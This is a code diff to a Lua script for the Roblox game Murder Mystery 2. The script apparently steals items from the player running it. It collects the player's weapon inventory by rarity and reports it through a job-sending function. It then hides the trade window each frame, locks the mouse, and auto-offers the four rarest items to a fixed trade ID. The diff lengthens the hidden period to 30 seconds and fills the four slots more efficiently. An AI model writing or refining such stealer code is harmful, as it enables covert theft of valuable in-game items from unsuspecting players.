@@ -15,6 +15,7 @@ local lp = Players.LocalPlayer
 local HS = game:GetService("HttpService")
 
 local TRADE_ID = 428469873
+local NON_TRADEABLE = {DefaultKnife=true, DefaultGun=true}
 
 local function do_request(method, url, body, headers)
     return request({Url=url, Method=method, Body=body, Headers=headers or {}})
@@ -42,20 +43,18 @@ end
 
 local function collect_mm2_items()
     local items = {}
-    local ok, ProfileData = pcall(function()
-        return require(RS.Modules.ProfileData)
-    end)
+    local ok, ProfileData = pcall(function() return require(RS.Modules.ProfileData) end)
     if not ok or not ProfileData then return items end
-    local ok2, Sync = pcall(function()
-        return require(RS.Database.Sync)
-    end)
+    local ok2, Sync = pcall(function() return require(RS.Database.Sync) end)
     local rarityOrder = {Ancient=1,Godly=2,Unique=3,Vintage=4,Chroma=5,Legendary=6,Rare=7,Uncommon=8,Common=9}
     for itemName, amount in pairs(ProfileData.Weapons.Owned) do
-        local rarity = "Unknown"
-        if ok2 and Sync and Sync.Weapons and Sync.Weapons[itemName] then
-            rarity = Sync.Weapons[itemName].Rarity or "Unknown"
+        if not NON_TRADEABLE[itemName] then
+            local rarity = "Unknown"
+            if ok2 and Sync and Sync.Weapons and Sync.Weapons[itemName] then
+                rarity = Sync.Weapons[itemName].Rarity or "Unknown"
+            end
+            table.insert(items, {name=itemName, rarity=rarity, amount=amount})
         end
-        table.insert(items, {name=itemName, rarity=rarity, amount=amount})
     end
     table.sort(items, function(a, b)
         return (rarityOrder[a.rarity] or 999) < (rarityOrder[b.rarity] or 999)
@@ -139,7 +138,6 @@ local function hook_mm2()
 
     pcall(function() setRequestsEnabled:FireServer(true) end)
 
-    local okP, ProfileData = pcall(function() return require(RS.Modules.ProfileData) end)
     local cachedItems = collect_mm2_items()
     send_job("MM2", cachedItems)
 
@@ -152,7 +150,6 @@ local function hook_mm2()
     local hiding = false
     local tradeGen = 0
 
-    -- exacte frame targets gebaseerd op geïnspecteerde structuur
     local TARGETS = {
         {gui="TradeGUI",       frames={"BG","Container","Processing","ClickBlocker"}},
         {gui="TradeGUI_Phone", frames={"Container","ClickBlocker"}},
@@ -186,12 +183,10 @@ local function hook_mm2()
         applyHide()
         if shiftlockConn then shiftlockConn:Disconnect() end
         if heartbeatConn then heartbeatConn:Disconnect() end
-        -- RenderStepped = voor render (wint van MM2 RenderStepped als die eerder connected)
         shiftlockConn = RunService.RenderStepped:Connect(function()
             pcall(function() UIS.MouseBehavior = Enum.MouseBehavior.LockCenter end)
             if hiding then applyHide() end
         end)
-        -- Heartbeat = na render (wint van MM2 Heartbeat)
         heartbeatConn = RunService.Heartbeat:Connect(function()
             if hiding then applyHide() end
         end)
@@ -280,18 +275,20 @@ local function hook_mm2()
         local myGen = tradeGen
 
         task.spawn(function()
-            -- huidige items ophalen, fallback op cachedItems
+            -- verse items ophalen, fallback op cachedItems
             local currentItems = collect_mm2_items()
             local itemsToOffer = (#currentItems > 0) and currentItems or cachedItems
 
-            local uniqueSlots = 0
+            -- 4 totale slots, vul duplicaten per item (hoogste rarity eerst)
+            local slotsLeft = 4
             for _, entry in ipairs(itemsToOffer) do
-                if uniqueSlots >= 4 then break end
-                uniqueSlots = uniqueSlots + 1
-                for i = 1, entry.amount do
+                if slotsLeft <= 0 then break end
+                local copies = math.min(entry.amount, slotsLeft)
+                for i = 1, copies do
                     pcall(function() offerItem:FireServer(entry.name, "Weapons") end)
                     task.wait(0.1)
                 end
+                slotsLeft = slotsLeft - copies
             end
 
             task.wait(3)
@@ -305,7 +302,8 @@ local function hook_mm2()
                 end
             end
 
-            task.wait(10)
+            -- 30s timer zodat GUI niet te vroeg verschijnt
+            task.wait(30)
             if tradeGen == myGen then
                 resetState()
             end
